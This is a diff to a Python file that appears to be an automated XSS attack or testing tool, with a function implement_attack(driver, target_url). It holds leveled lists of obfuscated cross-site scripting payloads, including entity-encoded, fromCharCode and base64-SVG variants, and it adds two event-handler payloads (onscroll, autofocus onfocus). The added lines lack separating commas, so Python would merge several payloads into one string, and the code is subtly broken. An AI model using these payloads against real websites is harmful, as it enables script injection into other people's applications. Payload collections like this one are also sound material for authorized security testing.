@@ -31,6 +31,8 @@ def implement_attack(driver, target_url):
         """<img src=&#0000106 onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041" id="xss">""",
         """<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))" id="xss"></img>""",
         """<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always" id="xss"></EMBED>"""
+        """<body onscroll=alert("XSS")><br><br><br><br><br><br>...<br><br><br><br><input autofocus>"""
+        """<input onfocus=alert("XSS") autofocus>"""
     ]
     xss_level_4 = [
         """<Img src = x onerror = "javascript: window.onerror = alert; throw 'XSS'" id="xss">""",
